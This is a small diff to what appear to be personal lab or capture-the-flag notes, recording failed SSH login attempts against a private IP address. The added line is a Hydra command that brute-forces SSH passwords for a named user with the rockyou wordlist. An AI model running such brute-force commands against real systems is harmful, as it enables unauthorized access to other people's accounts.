@@ -12,3 +12,7 @@ Permission denied, please try again.
 test@10.113.130.138's password: 
 
 no public key needed. but need to find out user?
+
+
+
+hydra -l SKYNET -P /usr/share/wordlists/rockyou.txt 10.113.130.138  ssh -t 4 -V -f
